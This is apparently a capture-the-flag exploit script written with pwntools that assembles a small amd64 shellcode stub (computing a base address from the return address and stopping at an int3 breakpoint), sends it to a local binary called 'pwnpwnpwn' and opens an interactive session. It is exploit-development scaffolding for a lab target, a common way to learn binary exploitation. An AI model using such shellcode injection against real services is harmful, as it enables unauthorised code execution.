from pwn import *

HOST, PORT = '0.0.0.0', 1337
BIN_PATH = './pwnpwnpwn'
r = remote(HOST, PORT)
r = process(BIN_PATH)

context.arch='amd64'
asms='''
push rbp
push r11
mov rbp, [rsp]
sub rbp, 0x144b

int3

pop r11
pop rbp
ret
'''
x=asm(asms)
pause()
r.send(x)
r.interactive()
